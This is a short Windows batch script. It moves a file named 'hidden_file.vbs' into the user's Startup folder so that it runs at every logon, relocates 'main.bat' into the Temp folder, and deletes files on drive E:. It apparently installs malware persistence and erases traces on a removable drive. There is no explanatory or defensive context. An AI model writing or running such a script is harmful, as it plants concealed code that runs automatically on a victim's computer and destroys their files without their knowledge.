@echo off
for %%A in (%USERNAME%) do (
move main.bat C:\Users\%%A\AppData\Local\Temp
move hidden_file.vbs "C:\Users\%%A\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
del "E:\Good one1\*_*"
)

exit
